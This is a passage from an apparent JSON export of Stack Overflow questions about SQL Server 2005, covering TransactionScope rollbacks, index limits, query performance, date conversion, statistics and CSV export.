yellow| 13  | CD\n2 June 2012 | green | 45  | CD\n2 June 2012 | blue  | 32  | AB\n2 June 2012 | red   | 37  | XY\n2 June 2012 | red   | 2   | XY\n2 June 2012 | red   | 1   | AB\n2 June 2012 | blue  | 4   | CD\n3 June 2012 | red   | 1   | AB\n3 June 2012 | blue  | 4   | CD\n3 June 2012 | blue  | 1   | XY\n3 June 2012 | yellow| 13  | CD\n3 June 2012 | green | 45  | CD\n3 June 2012 | blue  | 32  | AB\n</code></pre>\n\n<p>and so on...</p>\n"},{"tags":[".net","sql-server-2005","transactionscope","msdtc"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":207,"score":0,"question_id":11348215,"title":"TransactionScope occasionally not rolling back SQL Server 2005 transactions","body":"<p>I am a .NET developer of a system that uses .net 3.5 and <code>transactionScope</code> to make interactions with our database atomic. We occasionally use more than 1 datasource, but I am occasionally seeing this problem when using <code>TransactionScope</code> against a single SQL Server 2005 database.</p>\n\n<p>I am not a DBA so am unable to provide detailed database information, but can ask questions of our DBA's and post results here.</p>\n\n<p>I am constructing a new <code>TransactionScope</code> within my business logic logical layer, and then within this using block calling 3 data access code layer methods.  Each DAL layer method causes an insert stored procedure to be executed on the database.</p>\n\n<p>This generally works for days or weeks, handling thousands of inserts and ensuring that either all 3 insert stored procedures are committed, or none are committed.</p>\n\n<p>However, more and more frequently, we are finding that our database is completely locked up.  all 100 spids in the connection pool are being blocked, and always by the same sql text. The sql text is a single row insert statement into a table called 'offender'. This insert statement holds locks on the table, which given the tables importance prevents almost everything from running on the db - everything is being held in a blocking chain. The last batch time of that spid can be hours old. Meanwhile I can see the following .NET exception in my application error log. This is showing me that the MS DTC transaction timeout has been hit and the application has raised a .NET exception - but why is the insert (first stored procedure) still have a transaction open and locks being held? I would have thought that after the DTC transaction timeout had occurred, that the <code>TransactionScope</code> would have rolled back the transaction, and therefore freed up the locks?</p>\n\n<p>The DTC is configured with its default 60 sec timeout, and the transaction scope is using a default timeout as well.</p>\n\n<p>Example stacktrace:</p>\n\n<pre><code>    System.TimeoutException: Transaction Timeout\nat System.Transactions.TransactionState.EnlistPromotableSinglePhase(InternalTransaction tx, IPromotableSinglePhaseNotification promotableSinglePhaseNotification, Transaction atomicTransaction)     at \nSystem.Transactions.Transaction.EnlistPromotableSinglePhase(IPromotableSinglePhaseNotification promotableSinglePhaseNotification)     at \nSystem.Data.SqlClient.SqlInternalConnection.EnlistNonNull(Transaction tx)     at \nSystem.Data.SqlClient.SqlInternalConnection.Enlist(Transaction tx)     at \nSystem.Data.SqlClient.SqlInternalConnectionTds.Activate(Transaction transaction)     at \nSystem.Data.ProviderBase.DbConnectionInternal.ActivateConnection(Transaction transaction)     at \nSystem.Data.ProviderBase.DbConnectionPool.GetConnection(DbConnection owningObject)     at \nSystem.Data.ProviderBase.DbConnectionFactory.GetConnection(DbConnection owningConnection)     at \nSystem.Data.ProviderBase.DbConnectionClosed.OpenConnection(DbConnection outerConnection, DbConnectionFactory connectionFactory)     at \nSystem.Data.SqlClient.SqlConnection.Open()\n</code></pre>\n\n<p>Example of how creating transactionScope</p>\n\n<pre><code>using (TransactionScope scope = new TransactionScope())\n        {\n            int offenderID = offender.OffenderID.Value;\n            OffenderDAL offenderDAL = new OffenderDAL();\n\n            if (offenderID &gt; 0)\n            {\n                if(offenderDAL.Update(offender) == false)\n                    return false;\n            }\n            else\n                offenderID = offenderDAL.Insert(offender);\n\n            if(offenderID == 0)\n                return false;\n\n            offender.OffenderID = offenderID;\n            offence.OffenderID = offenderID;\n            offence.CreationDate = DateTime.Now;\n\n            int offenceID = dal.Insert(offence);\n            if (offenceID == 0)\n                return false;\n\n            offence.OffenceID = offenceID;\n            AttendanceDTO attendance = new AttendanceDTO();\n            attendance.OffenceID = offenceID;\n            attendance.AttendanceStatusID = 1;\n\n            AttendanceDAL attendanceDAL = new AttendanceDAL();\n            int attendanceID = attendanceDAL.Insert(attendance);\n\n            scope.Complete();\n            InvalidateCache();\n\n            return attendanceID &gt; 0;\n        }\n</code></pre>\n"},{"tags":["sql","query","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":48,"score":-1,"question_id":11346611,"title":"how to do this conversion in SQL","body":"<p>I have varchar contains date in the formate ddmmyyyy hh:mm:mm:ss</p>\n\n<p>I want to convert it to datetime with formate dd/mm/yyyy hh:mm:ss</p>\n\n<p>any idea how to do that please </p>\n"},{"tags":["sql","database","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1853,"score":1,"question_id":5631822,"title":"To get column names from table having a particular value","body":"<p>Please tell me How to get column names where column value =123 for a particular row.Thanks in advance .</p>\n"},{"tags":["sql","tsql","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":47,"score":0,"question_id":11342671,"title":"A very simple tsql issue","body":"<p>I need to check for duplicate records in my table while insert and update. Below is my query. It works fine in case of insert, but fails at update. I am unable to figure that out. Please help me.</p>\n\n<pre><code>Insert:\n\nSet @Count =  (Select ISNULL(Count(*),0) From AccountMaster Where [Name] = @Name and Id=@Id and Flag=1);\nIf @Count &gt;0 and @InsertUpdateFlag=1\n  BEGIN\n    Set @DbErrormessage = 'Business Name and Account Id must be unique. Try again.';\n  END   \n</code></pre>\n\n<p>Update :</p>\n\n<pre><code>Set @Count =  (Select Count(*) From AccountMaster Where [Name] = @Name and Id &lt;&gt; @Id and Flag=1);\n If @Count &gt;0 and @InsertUpdateFlag=2\n  BEGIN\n   Set @DbErrormessage = 'Business Name is in already in use by some other account. Try another one.';\n  END\n</code></pre>\n\n<p>The condition of update is that the Id and Name must not exist in the database. So I am taking count where name doesnot exists with any other id. But it seems , not working.</p>\n\n<p>Below is my table schema.</p>\n\n<pre><code>SELECT [PkId] //Primary Key as Int\n      ,[Id]  // Unique Key varchar(25)\n      ,[Created]\n      ,[Type]\n      ,[Status]\n      ,[Name]  //Business Name\n      ,[ContactPerson]\n      ,[ContactNumber]\n      ,[Email]\n      ,[Address]\n      ,[LocationId]\n      ,[Remarks]\n      ,[Flag]\n  FROM [AccountMaster]\n</code></pre>\n\n<p>Id and Business Name must be unique while both insert/update. So I need to check it while insert and update.</p>\n"},{"tags":["database","sql-server-2005"],"answer_count":3,"favorite_count":1,"up_vote_count":6,"down_vote_count":0,"view_count":9016,"score":6,"question_id":1119834,"title":"What is the proper way to move a database from one drive to another in SQL Server 2005?","body":"<p>I'm not looking to relocate the database to another server entirely, but just move the data file(s) and log file to another drive with more space. I've seen conflicting directions on how to do this, so I'm looking for the recommended proper way of doing it.</p>\n"},{"tags":["sql-server-2005","ssis"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":144,"score":1,"question_id":1126236,"title":"How to determine where, or if, a variable is used in an SSIS package","body":"<p>I've inherited a collection of largely undocumented ssis packages.  The entry point package (ie: the one that forks off in a variety of directions to call other packages) defines a number of variables.  I would like to know how these variables are being used, but there doesn't seem to be an equivalent of \"right click/Find All References\"</p>\n\n<p>Is there a reliable way to determine where these variables are being used?</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":48,"score":3,"question_id":11339092,"title":"sql server 2005 wrong output","body":"<p>I have 3 table stock,inward,issue</p>\n\n<p>Stock table's columns and data :</p>\n\n<pre><code>part_no | part_name | totalqty\n10100        ciol      30\n112233       abc       20\n123456       coper      50\n</code></pre>\n\n<p>inward table :</p>\n\n<pre><code>part_no | qty\n123456   10\n123456   20\n10100    20\n112233   15\n10100    25\n</code></pre>\n\n<p>issue table :</p>\n\n<pre><code>part_no | qty\n112233   20\n112233   15\n123456   10\n112233   25\n10100    40\n10100    20\n</code></pre>\n\n<p>my desired output :</p>\n\n<pre><code>part_no | part_name  |inwardQty |issueQty\n10100      coil         45     60\n112233     abc          15     60\n123456     coper        30     10\n</code></pre>\n\n<p>following is the query i have written,but not giving my desired output</p>\n\n<pre><code>select s.part_no,s.part_name,sum(i.qty) as inwardQty,sum(p.qty)as issueQty \nfrom stock s \nleft join inward i on s.part_no = i.part_no\nleft join issue p on s.part_no = p.part_no \ngroup by \n    s.part_no,s.part_name\n</code></pre>\n\n<p>getting following output by this query :  </p>\n\n<pre><code>part_no | part_name  |inwardQty |issueQty\n10100      coil         90     120\n112233     abc          45     60\n123456     coper        30     20\n</code></pre>\n"},{"tags":["c#","sql","sql-server-2005","tsql","concurrency"],"answer_count":4,"favorite_count":2,"up_vote_count":4,"down_vote_count":0,"view_count":653,"score":4,"question_id":2109156,"title":"SELECT and UPDATE table so there is no overlap of Threads","body":"<p>Say I have the following table:</p>\n\n<pre><code>ID|Read\n-------\n 1|true\n 2|false\n 3|false\n 4|false\n</code></pre>\n\n<p>... and I need to read the smallest ID, that has [Read] == false; plus, update that I have now read it.</p>\n\n<p>So if i execute my Stored Procedure dbo.getMinID, it will return ID: 2, and update [Read] -> true.</p>\n\n<pre><code>CREATE PROCEDURE [dbo].[getMinID]\n(\n  @QueryID INT OUTPUT \n)\nBEGIN\n  SELECT TOP 1 @QueryID = [ID] from Table\n  UPDATE Table SET [Read] = 1 WHERE [ID] = @QueryID \nEND\n</code></pre>\n\n<p>The problem is that I have ten (10) asynchronous Threads executing dbo.getMinID, at the same time, and I CANNOT have them select the SAME [ID] under any circumstances. I am worried that a second thread my execute between my SELECT and UPDATE statement, thus returning [ID]: 2 in both scenarios.</p>\n\n<p>How can I ensure that I do not select/update the same record twice, no matter how many threads are acting upon the Stored Procedure?  ALSO, please keep in mind that the table CONSTANTLY has new rows added, so I cannot lock the table!</p>\n"},{"tags":["sql","sql-server","tsql","sql-server-2005","stored-procedures"],"answer_count":2,"favorite_count":1,"up_vote_count":8,"down_vote_count":0,"view_count":232,"score":8,"question_id":11119432,"title":"Parameter doesn't perform as well as hard coding the value","body":"<p>I have a stored procedure that performs terribly. When I declare a variable, set its value and then use it in the where clause the statement takes over an hour to run. When I hard code the variables in the where clause it runs in less than a second.</p>\n\n<p>I started to look into what was wrong with it through execution plans. It looks like when I try and pass it some declared variables the execution plan crates some Hash Match because it selects values from a view that uses a UNION and a common table expression.</p>\n\n\n\n<pre>\n/*************   Begin of Stored Procedure ***************/\nCREATE PROCEDURE GetFruit\n  @ColorId bigint,\n  @SeasionId bigint\nWITH RECOMPILE\nAS\nBEGIN\n\nSELECT\n    A.Name\nFROM\n    [Apple_View] A   /* This is the view down below */\n    INNER JOIN [Fruit] F\n        ON ( F.ColorId = @ColorId\n            AND A.FruitId = F.FruitId)          \nWHERE\n    (A.ColorId = @ColorId\n    AND \n    A.SeasonId = @SeasonId)\n\nEND\n/************* End of Stored Procedure   ***************/\n\n/************* Begin of View   ***************/\nWITH Fruits (FruitId, ColorId, SeasonId) AS\n(\n    -- Anchor member\n    SELECT\n        F.FruitId\n        ,F.ColorId\n        ,F.SeasonId\n    FROM\n        ((  \n            SELECT DISTINCT\n                EF.FruitId\n                ,EF.ColorId\n                ,EF.SeasonId\n                ,EF.ParentFruitId\n            FROM\n                ExoticFruit EF\n                INNER JOIN Fruit FR\n                    ON FR.FruitId = EF.FruitId\n        UNION\n            SELECT DISTINCT\n                SF.FruitId\n                ,SF.ColorId\n                ,SF.SeasonId\n                ,SF.ParentFruitId               \n            FROM\n                StinkyFruit SF\n                INNER JOIN Fruit FR\n                    ON FR.FruitId = SF.FruitId\n        UNION\n            SELECT DISTINCT\n                CF.FruitId\n                ,CF.ColorId\n                ,CF.SeasonId\n                ,CF.ParentFruitId\n            FROM\n                CrazyFruit CF\n                INNER JOIN Fruit FR\n                    ON FR.FruitId = CF.FruitId\n\n            )) f\n\n    UNION ALL\n\n    -- Recursive Parent Fruit\n    SELECT \n        FS.FruitId\n        ,FS.ColorId\n        ,FS.SeasonId\n        ,FS.ParentFruitId\n    FROM\n        Fruits FS\n        INNER JOIN MasterFruit MF\n            ON  MF.[ParentFruitId] = fs.[FruitId]\n)\n\nSELECT DISTINCT\n    FS.FruitId\n    ,FS.ColorId\n    ,FS.SeasonId\n    FROM\n        Fruits FS\n\n/************* End of View   ***************/\n\n\n/* To Execute */\nEXEC GetFruit 1,3\n</pre>\n\n<p>If I run the Stored Procedure using the set values it takes over an hour and here is the execution plan.\n<img src=\"http://i.stack.imgur.com/FfMq2.png\" alt=\"With Variables\"></p>\n\n<p>If I run the Stored Procedure removing the DECLARE and SET values and just set the Where clause to the following statement it runs in less than a second and here is the execution plan:</p>\n\n<pre class=\"lang-sql prettyprint-override\"><code>WHERE(A.ColorId = 1 AND  A.SeasonId = 3)\n</code></pre>\n\n<p><img src=\"http://i.stack.imgur.com/g3Gcw.png\" alt=\"hard coded where clause\"></p>\n\n<p>Notice how the hard coded variables uses indexing while the first uses a hash set. Why is that? Why are hard coded values in the where clause working different from the declared variables?</p>\n\n<p><strong>-------this is what finally performed with the help of @user1166147------</strong></p>\n\n<p>I changed the stored procedure to use sp_executesql.</p>\n\n<pre>\nCREATE PROCEDURE GetFruit\n  @ColorId bigint,\n  @SeasionId bigint\nWITH RECOMPILE\nAS\nBEGIN\n\nDECLARE @SelectString nvarchar(max)\n\nSET @SelectString = N'SELECT\n    A.Name\nFROM\n    [Apple_View] A   /* This is the view down below */\n    INNER JOIN [Fruit] F\n        ON ( F.ColorId = @ColorId\n            AND A.FruitId = F.FruitId)          \nWHERE\n    (A.ColorId = ' + CONVERT(NVARCHAR(MAX), @ColorId) + '\n    AND \n    A.SeasonId = ' + CONVERT(NVARCHAR(MAX), @SeasonId) + ')'\n\nEXEC sp_executesql @SelectString\n\nEND\n</pre>\n"},{"tags":["sql-server-2005","excel-vba","oledb"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":108,"score":0,"question_id":11331265,"title":"Excel SQLOLEDB returns empty recordset","body":"<p>I have some Excel VBA code fetching data from SQL server 2005 that looks like this (using MDAC 2.8)</p>\n\n<pre><code>Dim sqlCommand As New ADODB.Command\nDim rs As ADODB.Recordset\n\nconnection.DefaultDatabase = \"DatabaseName\"\n\nsqlCommand.ActiveConnection = connection\nsqlCommand.CommandType = adCmdText\nsqlCommand.CommandText = \"SELECT * FROM Table\"\n\nSet rs = sqlCommand.Execute\n</code></pre>\n\n<p>The connection string is <code>Provider=SQLOLEDB;Data Source=Server;Initial Catalog=database;trusted_Connection=yes</code></p>\n\n<p>The code works fine on my machine but on a clients machine it returns an empty recordset without any error.</p>\n\n<p>A strange thing is that if I try to use a CTE <code>WITH X AS (SELECT Y FROM T) SELECT Y FROM X</code> I get an error message saying <code>Syntax error near 'WITH'</code>. (The database is in 2005 mode!)</p>\n\n<p>If I prefix the CTE with a semicolon <code>;WITH X AS (SELECT Y FROM T) SELECT Y FROM X</code> I don't get the error message but still an empty recordset.</p>\n\n<p>Somehow it feels like the connection prefixes my query with something and I see the result of that prefix.</p>\n\n<p>I don't have access to the profiler at the client.</p>\n\n<p>Is there something in the database login?\nCould it be the DefaultDatabase that interferes with the query (if so, why not on my machine)?</p>\n\n<p>I get the connection string from an external source so I can't change the initial catalog or provider. </p>\n"},{"tags":["sql-server-2005","csv","file-format"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":1097,"score":0,"question_id":2259446,"title":"Need to export fields containing linebreaks as a CSV from SQL Server","body":"<p>I'm running a query from SQL Server Management Studio 2005 that has an HTML file stored as a  a string, e.g.:</p>\n\n<pre><code>SELECT html \nFROM table \n</code></pre>\n\n<p>This query displays in the \"Results\" window nicely, i.e., each row contains a string of the whole HTML file, with one record per row. </p>\n\n<p><strong>However,</strong> when I use the \"Results to file\" option, it exports it as an unusable CSV with line breaks in the CSV occurring wherever line breaks occurred in the field (i.e., in the HTML), rather than one per row as needed. I tried experimenting with the Query>Query Options for both the \"Grid\" and \"Text\" results, to no avail. The fields exported to the CSV <strong>do not</strong> appear to be enclosed within quotes. </p>\n\n<p>Some ideas:</p>\n\n<ol>\n<li><p>Might it be possible to append\nquotation marks w/ the SQL? </p></li>\n<li><p>Is there some T-SQL equivalent to the\nWITH CSV HEADER commands that are\npossible in other dialects?</p></li>\n</ol>\n"},{"tags":["sql","sql-server","sql-server-2008","sql-server-2005","tsql"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":111,"score":0,"question_id":9412563,"title":"How to add a unique constraint on serveral columns, with a condition?","body":"<p>Question:</p>\n\n<p>I want to add a unique constraint on a mapping table (n:n).<br />\nI want that new values may be inserted, but only if TEST_FK_UID, TEST_DateFrom and TEST_DateTo are not equal to an already existing entry.<br />\n<br /></p>\n\n<p>The problem is the status field.<br />\nStatus 1 means active..<br />\nStatus != 1 means inactive/deleted..<br />\n.<br />.<br />\nSo one may of course insert a new entry with the same FK, DateFrom and DateTo, IF - and only if - the status of the existing entry (all existing entries, as you can insert, delete, insert, delete, insert, delete, etc.) is != 1 </p>\n\n<p>Here is what I have so far:</p>\n\n<pre><code>CREATE TABLE dbo._________Test  \n(\n     TEST_UID uniqueidentifier NOT NULL \n    ,TEST_FK_UID uniqueidentifier NOT NULL \n    ,TEST_DateFrom DateTime NOT NULL \n    ,TEST_DateTo DateTime NOT NULL  \n    ,TEST_Status int NOT NULL \n    ,UNIQUE(TEST_FK_UID, TEST_DateFrom, TEST_DateTo, TEST_Status) \n); \n</code></pre>\n"},{"tags":["sql-server","tsql","sql-server-2005","datetime"],"answer_count":6,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":361,"score":1,"question_id":11318574,"title":"Apply week number to dates for whole weeks only","body":"<p>The time is: <code>(m/d/yyyy) =&gt; 2009/01/04</code></p>\n\n<p><img src=\"http://i.stack.imgur.com/JUwzj.jpg\" alt=\"enter image description here\"></p>\n\n<p>Using this command <code>using datepart(wk,'20090104')</code> I can get the week number (for any given date).</p>\n\n<p>So :</p>\n\n<pre><code>SELECT datepart(wk,'20090101') //1\nSELECT datepart(wk,'20090102') //1\nSELECT datepart(wk,'20090103') //1\nSELECT datepart(wk,'20090104') //2\n</code></pre>\n\n<p>So far so good.</p>\n\n<p>The problem : </p>\n\n<p>Those 3 first dates are not part of a full week, so I can't put them in a fixed 52-week chart.</p>\n\n<p>Our company needs to see information about each <strong>whole</strong> week in the <strong>52 weeks</strong> of a year.  (Each year has 52 whole weeks).</p>\n\n<p><img src=\"http://i.stack.imgur.com/CvN35.jpg\" alt=\"enter image description here\"></p>\n\n<p>So <code>20090101</code> doesn't belong to the first week of 2009 !</p>\n\n<p>It belongs to the previous year (<em>which is irrelevant to my question</em>)</p>\n\n<p>So I need a UDF (<em>I've been searching a lot, and <code>ISOWEEK</code> is not answering my needs</em>) which by a given <code>datetime</code>, will give me the <code>Week Number</code> (week = whole week, so partial weeks aren't considered).</p>\n\n<p>Example : </p>\n\n<pre><code>calcweekNum ('20090101') //52 ...from the last year\ncalcweekNum ('20090102') //52 ...from the last year\ncalcweekNum ('20090103') //52 ...from the last year\ncalcweekNum ('20090104') //1\n..\n..\ncalcweekNum ('20090110') //1\ncalcweekNum ('20090111') //2\ncalcweekNum ('20090112') //2\n...\n</code></pre>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","statistics","query-execution-plans"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":128,"score":0,"question_id":11321740,"title":"What exactly is saved in SQL Server Statistics? When they get updated? Is SQL Server itself is taking care of them?","body":"<p>I have been working with SQL Server as a Developer a while.</p>\n\n<p>One thing I learnt is SQL Server manages Statistics which help Engine to create optimized execution plan.</p>\n\n<p>I could not figure out what exactly is stores in Statistics? (I read it saves Vector, but what Vector?)</p>\n\n<p>When/In which scenario SQL Server updates Statistics?</p>\n\n<p>How/why some time they go out of sync (old Statistics)</p>\n\n<p>In case of old Statistics is a manual DBA/Developer intervention is required or SQL Server Will get them updated.</p>\n\n<p>As a DBA/Developer how to find out if Statistics OLD? What should we do?</p>\n"},{"tags":["sql-server-2005","ado.net","timeout","sqlexception"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":597,"score":0,"question_id":7096728,"title":"Procedure times out from ADO.NET but not in SSMS","body":"<p>I've got a stored procedure that is giving me a SqlException because of a timeout when I run it from code (with timeout set to 30). When I run the procedure directly in Management Studio, it executes in under 1 second. I also only get the timeout when running it against a specific database. When I use other databases it finishes quickly without an error. Here is the full error message:</p>\n\n<pre><code>System.Data.SqlClient.SqlException (0x80131904): Timeout expired.  The timeout period elapsed prior to completion of the operation or the server is not responding.\n   at System.Data.SqlClient.SqlConnection.OnError(SqlException exception, Boolean breakConnection)\n   at System.Data.SqlClient.SqlInternalConnection.OnError(SqlException exception, Boolean breakConnection)\n   at System.Data.SqlClient.TdsParser.ThrowExceptionAndWarning()\n   at System.Data.SqlClient.TdsParser.Run(RunBehavior runBehavior, SqlCommand cmdHandler, SqlDataReader dataStream, BulkCopySimpleResultSet bulkCopyHandler, TdsParserStateObject stateObj)\n   at System.Data.SqlClient.SqlDataReader.ConsumeMetaData()\n   at System.Data.SqlClient.SqlDataReader.get_MetaData()\n   at System.Data.SqlClient.SqlCommand.FinishExecuteReader(SqlDataReader ds, RunBehavior runBehavior, String resetOptionsString)\n   at System.Data.SqlClient.SqlCommand.RunExecuteReaderTds(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, Boolean async)\n   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method, DbAsyncResult result)\n   at System.Data.SqlClient.SqlCommand.RunExecuteReader(CommandBehavior cmdBehavior, RunBehavior runBehavior, Boolean returnStream, String method)\n   at System.Data.SqlClient.SqlCommand.ExecuteReader(CommandBehavior behavior, String method)\n   at System.Data.SqlClient.SqlCommand.ExecuteDbDataReader(CommandBehavior behavior)\n   at System.Data.Common.DbCommand.System.Data.IDbCommand.ExecuteReader(CommandBehavior behavior)\n</code></pre>\n\n<p>Does this stack trace mean anything to anyone? It looks like maybe my sproc completed and it timed out while trying to read some kind of meta data?</p>\n\n<p>I tried looking at the process while it is running and it is Suspended. sys.dm_os_waiting_tasks shows the wait type as IO_COMPLETION, if that's of any use. The only processes I see on the database using sp_who2 'active' are the one timing out and my active SSMS window so I don't think it's a blocking issue. I verified this database has the same indeces as a working database and ran dbcc checkdb without any errors on it. How can I determine the cause of the timeout?</p>\n"},{"tags":["php","sql-server-2005"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":5,"view_count":2033,"score":-4,"question_id":7723701,"title":"Where from I can download php_sqlsrv.dll?","body":"<p>I googled, binged to search the php_sqlsrv.dll for MSSQL support in apache. But cant find any download link.</p>\n\n<p>Kindly help</p>\n"},{"tags":["asp.net",".net","sql-server-2005","iis"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":137,"score":0,"question_id":11320241,"title":"how to access to sql server database from another server thru aspx web app","body":"<p>I have a web application running in a server different than where the sql server database is. </p>\n\n<p>I try to access to the server databse from the web application thru iis and it say \"sql server does not exist\" , but</p>\n\n<p>the Curious thing its when i run my application in my local machine (run from visual studio)  allow me to get the data from my sql sentence from the remote sql server</p>\n\n<p>Its there anybody can help me to deal with this problem i have?</p>\n"},{"tags":["mysql","sql-server-2005","visual-studio-2005","ssis","dts"],"answer_count":3,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":976,"score":0,"question_id":1269579,"title":"Convert a MySql database to MS SQL Server 2005 with data?","body":"<p>I'm trying to create a completely new database from an existing MySQL database, bringing over both data and schema, but so far the only way I've been able to do this is to first import the MySQL database into MS Access, and then into SQL Server 2005? Crazy right? Surely, there is a way that doesn't involve a tedious, custom time-consuming programming, right (perhaps using SSIS)?</p>\n\n<p>A few additions to my original description above:</p>\n\n<ul>\n<li>Its a pretty good size database (easily a few gigs).</li>\n<li>I'm working in an MS environment (asp.net, C#)</li>\n<li>I'm under a tight deadline so I'm looking for an automated process that requires little to no effort in the conversion process.</li>\n<li>SSIS would be the preferred way via BIDS (VS 2005)</li>\n</ul>\n\n<p>Thanks for all the great input!</p>\n"},{"tags":["sql","sql-server","sql-server-2005"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":81,"score":0,"question_id":11317529,"title":"Populating column from another column","body":"<p>I'm going to be importing the data and I have a field that will have a 2-4 digit number.  I need to change that number to x0001 or x0200 depending if it was 1 or 200.  Whats the easiest way to do that in SQL Server 2005?</p>\n"},{"tags":["sql-server","sql-server-2008","sql-server-2005","non-clustered-index"],"answer_count":6,"favorite_count":1,"up_vote_count":3,"down_vote_count":0,"view_count":993,"score":3,"question_id":4245086,"title":"Reason for the count of non clustered index in Sql Server","body":"<p>Why we have 249 non clustered index in sql server 2005? why not 240 or 300? \nand the same question for sql server 2008, why 999 ? Why not 800 or 1000?</p>\n"},{"tags":["performance","sql-server-2005","coldfusion","indexing","non-clustered-index"],"answer_count":5,"favorite_count":0,"up_vote_count":3,"down_vote_count":0,"view_count":300,"score":3,"question_id":3041900,"title":"Improve SQL Server 2005 Query Performance","body":"<p>I have a course search engine and when I try to do a search, it takes too long to show search results. You can try to do a search here </p>\n\n<p><a href=\"http://76.12.87.164/cpd/testperformance.cfm\" rel=\"nofollow\">http://76.12.87.164/cpd/testperformance.cfm</a></p>\n\n<p>At that page you can also see the database tables and indexes, if any.</p>\n\n<p>I'm not using Stored Procedures - the queries are inline using Coldfusion.</p>\n\n<p>I think I need to create some indexes but I'm not sure what kind (clustered, non-clustered) and on what columns.</p>\n\n<p>Thanks</p>\n"},{"tags":["sql-server-2005","index","non-clustered-index"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":406,"score":2,"question_id":2973520,"title":"How to set index on the column which have datatype varchar(4096) in SQL Server 2005?","body":"<p>This is the query for creating index\ncreate index idx_ncl_2 on BFPRODATTRASSOCIATION (value,attributeid) include (productid)</p>\n\n<p>Table structure of BFPRODATTRASSOCIATION</p>\n\n<pre><code>ProdAttrAssociationId bigint no 8\nProductId             bigint no 8\nAttributeId           bigint  no  8\nValue                 varchar no 4096\n</code></pre>\n\n<p>I am getting this error:</p>\n\n<p>The maximum key length is 900 bytes. The index idx_ncl_2 has maximum length of 1237 bytes. </p>\n\n<p>I have to create a nonclustered index on this column. Is there any way i can create index for the column which have datatype of varchar and size is greater than 900.</p>\n\n<p>Please suggest.</p>\n"},{"tags":["sql-server-2005","non-clustered-index"],"answer_count":2,"favorite_count":2,"up_vote_count":3,"down_vote_count":0,"view_count":1906,"score":3,"question_id":5871064,"title":"How do I check if a nonclustered index exists in SQL Server 2005","body":"<p>I have the following:</p>\n\n<pre><code>CREATE NONCLUSTERED INDEX [MyTableIndex]\nON [dbo].[tablename] ([tablename_ID],[tablename_Field1])\nINCLUDE ([Tablename_Field2],[Tablename_Field3])\n</code></pre>\n\n<p>I want to create an if statement to check if this exists. How do I do this?</p>\n"},{"tags":["sql-server-2005","join","clustered-index","non-clustered-index"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":115,"score":0,"question_id":7962827,"title":"SQL Server : How to improve a 3 join query using costly Non clustered Index Seek","body":"<p>I have a query which makes a inner join of 3 tables.</p>\n\n<pre><code>SELECT DISTINCT A.ID, &lt;OTHER 'A' FIELDS&gt; \nFROM C \nLEFT JOIN B ON C.Bin_ID = B.Bin_ID \nLEFT JOIN A ON B.App_ID = A.App_ID  \nWHERE\n   ((A.App_NAME LIKE '%%') AND (B.App_ID IS NOT NULL))  \nORDER BY \n    A.App_NAME ASC\n</code></pre>\n\n<p>Data present in the tables mentioned-></p>\n\n<ul>\n<li>Table A: 8000 rows</li>\n<li>Table B: 900000 rows</li>\n<li>Table C: 10,00,000 rows</li>\n</ul>\n\n<p>Following is the stats revealed from the SQL Server query plan :</p>\n\n<p>Here Two costly index seeks are used, the upper index seek has the following stats:</p>\n\n<pre><code>Object: B.App_ID [non clustered index, non unique] \nSeek Predicate: B.App_ID = A.App_ID[clustered index,unique]\n</code></pre>\n\n<p>the bottom index seek has the following stats:</p>\n\n<pre><code>Object: C.Bin_ID [non clustered index, non unique] \nSee Predicate: C.Bin_ID = B.Bin_ID[clustered index,unique]\n</code></pre>\n\n<p>Now this query takes 5 minutes to execute on an average and I am not able to figure out what should be done make it faster since the query uses Index seeks already. {All joins are necessary for the result set}. Need Help !</p>\n"},{"tags":["excel","sql-server-2005","cluster-computing","jet"],"answer_count":0,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":58,"score":0,"question_id":11260490,"title":"Using microsoft ace.oledb.12.0 clustered environment","body":"<p>Has any one successfully used MicroSoft's ace.oledb.12.0 provider (installed via either \"2007 Office System Driver: Data Connectivity Components\" or \"Microsoft Access Database Engine 2010 Redistributable\" in a clustered environment? We have SQL Server 2005 on a 64bit server.</p>\n\n<p>I could do with using it to load an Excel spreadsheet from SQL server table data, but our Technical Services team have advised me that our SQL servers run in a clustered environment.</p>\n\n<p>Any advice appreciated. Thank you.</p>\n\n<p>Best regards,\nDuane.</p>\n"},{"tags":["sql-server","sql-server-2005","index","clustered-index","non-clustered-index"],"answer_count":5,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":415,"score":2,"question_id":3404524,"title":"Where clause on non-clustered index Vs extra join and where clause on clustered index","body":"<p>I am trying to eak out a bit extra performance from some sql queries which have a where clause on a field which is a non-unique non-clustered index, it is also a foreign key in table A. That foreign key is the primary key on table B and is the clustered index.</p>\n\n<p>What I'm wondering is, will I get a performance gain if I add a join from table A to table B and have the where clause on the field which is the clustered index (as opposed to the non-clustered index without the extra 